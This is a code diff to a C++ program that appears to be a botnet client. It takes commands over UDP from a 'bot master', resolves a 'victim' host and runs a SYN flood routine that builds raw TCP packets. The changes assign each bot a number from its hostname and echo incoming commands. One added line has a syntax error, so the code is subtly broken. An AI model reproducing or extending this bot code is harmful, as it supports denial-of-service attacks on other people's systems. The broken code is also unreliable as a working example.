@@ -19,7 +19,8 @@
 
 using namespace std;
 
-int botNo = 1;
+int botNo;
+
 // 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
 
 unsigned short csum(unsigned short *,int);
@@ -64,6 +65,13 @@ int print_time(){
     usleep(1000);
     get_current_time();
 }
+void getBotNo(){
+    char hostname[1024];
+    hostname[1023] = '\0';
+    gethostname(hostname, 1023);
+    cout << "Host name:" hostname << endl;
+    botNo = hostname[3] - 48;
+}
 int main(void)
 {
 	
@@ -71,6 +79,8 @@ int main(void)
 	int messageBufferSize = sizeof(messageBuffer);
 	int UDPSocket;     // Socket connected to UDP;
 	int UDPPort = botsPort[botNo-1];  // UPD port used to reveive the command from bot master;
+
+    
 
     print_time();
 	cout << "Bort "<< botNo << " started" << endl << endl;	
@@ -126,7 +136,7 @@ void parseCommand(char command[])
     {
         struct hostent *hostinfo = NULL; //Host name
         char victim_ip[256];
-        cout << "SYN attacking..." << endl;
+        cout << command << endl;
         hostinfo = gethostbyname(victim);
         sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
         cout << victim_ip << endl;
